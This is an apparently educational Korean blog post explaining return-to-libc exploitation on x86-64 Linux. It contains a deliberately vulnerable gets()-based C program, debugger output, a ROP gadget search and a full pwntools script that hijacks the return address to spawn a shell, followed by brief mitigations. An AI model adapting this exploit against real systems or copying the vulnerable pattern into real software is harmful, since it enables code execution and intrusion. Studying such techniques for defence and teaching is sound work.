---
title: "Return to Libc"
date: "2025-02-09"
author: "Beomsu Lee"
tags: ["system hacking", "stack"]
---

버퍼 오버플로우 취약점을 이용한 공격 기법 중 하나이다. DEP(Data Execution Prevention)를 우회하는 방법으로, 스택이 아닌 libc 라이브러리 함수들을 호출하여 코드 실행을 조작하는 기법이다.

> DEP는 스택에 있는 쉘코드가 실행되지 않도록 보호하는 기법이다.

## Exploit Plan

1. 취약한 프로그램에서 버퍼 오버플로우 발생 가능성 분석
2. 프로그램이 사용하는 libc 라이브러리 내 `system()` 함수 주소 확보
3. `/bin/sh` 문자열이 메모리에 있는지 확인 (또는 주입)
4. 스택을 조작해 리턴 주소를 `system()` 함수 주소로 설정
5. `system("/bin/sh")` 실행하여 쉘 확보

## Proof of Concept

```cpp
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[64];
    gets(buffer);  
    printf("%s", buffer);
}

int main() {
    vuln();  
    return 0;
}
```

### Vulnerability Analysis

`gets()`를 사용해 길이 검증 없이 입력을 복사하기 때문에 버퍼 오버플로우 취약점이 존재한다.

스택 메모리 구조는 다음과 같다.

buffer(64 byte) + RBP(8 byte) + Return Address(8 byte)

따라서 다음과 같은 페이로드를 작성하고 리턴 주소까지 덮이는지 확인해보자.

```shell
payload = b'A'*64 + b'B'*8 + b'C'*8
```

`vuln()`의 `leave`를 수행하기 전 RBP를 확인해보면 0x4242424242424242으로 덮어씌워져 있고, 리턴 주소 또한 0x4343434343434343로 덮어씌워져 있다.

```
pwndbg> x/24gx $rbp
0x7ffe0c9662c0: 0x4242424242424242      0x4343434343434343
```

즉, 리턴 주소 변조를 통해 RIP를 변조할 수 있으므로, 결국 실행흐름까지 변조할 수 있게 된다.

### Exploit

`system("/bin/sh")`를 실행하기 위해 메모리 내 존재하는 "/bin/sh" 위치를 알아내야 한다. pwndbg에서는 `search`라는 명령어를 통해 "/bin/sh"의 위치를 쉽게 알아낼 수 있다.

```
pwndbg> search /bin/sh
Searching for byte: b'/bin/sh'
libc.so.6       0x7ffff7dcb42f 0x68732f6e69622f /* '/bin/sh' */
```

라이브러리의 `system()` 주소도 `p` 명령을 통해 알아낸다.

```cpp
pwndbg> p system
$3 = {int (const char *)} 0x7ffff7c58750 <__libc_system>

```

ASLR이 해제되어 있어 확보한 주소들은 변하지 않는다. 

이제 쉘을 실행하기 위한 정보는 다 얻었으니, 리턴 주소를 변조해보자. 64bit는 함수 호출 시 레지스터를 이용해 인자를 전달한다. 

> 32bit는 스택을 이용해 인자를 전달했다.

|인자 순서 | 	레지스터|	역할|
|:-:|:-:|:-:|
|1번째	|RDI	|첫 번째 인자|
|2번째	|RSI	|두 번째 인자|
|3번째	|RDX	|세 번째 인자|
|4번째	|RCX	|네 번째 인자|
|5번째	|R8	|다섯 번째 인자|
|6번째	|R9|	여섯 번째 인자|
|7번째 이후|	스택(RSP)|	추가적인 인자|

64bit 함수 호출 시 첫 번째 인자는 RDI로 전달한다. 따라서 "/bin/sh"의 주소를 RDI에 저장한 다음 `system()`을 호출시키면 된다. 

RDI에 "/bin/sh"의 주소를 저장시키기 위해선 `pop rdi` 가젯이 필요하다. `ROPGadget` 명령어를 통해 해당 가젯을 찾을 수 있다.

```shell
$ ROPgadget --binary /usr/lib/x86_64-linux-gnu/libc.so.6  | grep 'pop rdi ; ret'
0x000000000010f75b : pop rdi ; ret
```

프로그램 실행 시 "libc.so의 base 주소" + "가젯 주소"를 하면 프로그램이 실행될 때의 해당 가젯 주소를 얻을 수 있다.

```
pwndbg> x/2i 0x7ffff7d0f75b
   0x7ffff7d0f75b <__spawnix+875>:	pop    rdi
   0x7ffff7d0f75c <__spawnix+876>:	ret
```

다음과 같이 페이로드를 작성한 뒤 실행시키면 쉘을 얻을 수 있다. 중간에 추가한 `ret` 가젯의 경우 16 byte 정렬을 맞춰주기 위함이다. 맞춰주지 않으면 쉘을 확보하기 전 에러가 발생하게 된다.

```py
from pwn import *

p = process('./vuln')

pop_rdi = p64(0x7ffff7d0f75b)
bin_sh = p64(0x7ffff7dcb42f)
system = p64(0x7ffff7c58750)
ret = p64(0x0000000000401190)

payload = b'A'*64 + b'B'*8 + ret + pop_rdi + bin_sh + system
p.sendline(payload)

p.interactive()
```

```shell
$ ../python exploit.py
[+] Starting local process './vuln': pid 259989
[*] Switching to interactive mode
$ id
uid=1000(..) gid=1000(..) groups=1000(..),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)
```

## Protection

### Stack Protection

- Stack Canaries: 카나리를 통해 스택 버퍼 오버플로우를 감지
- ASLR(Address Space Layout Randomization): 라이브러리 주소를 무작위화하여 공격을 방지

### Using Safe Functions

- `gets()` 대신 `fgets()`, `strcpy()` 대신 `strncpy()` 사용
- 입력 검증 및 길이 제한

## References

- [02.RTL(Return to Libc) - x64](https://www.lazenca.net/display/TEC/02.RTL%28Return+to+Libc%29+-+x64)
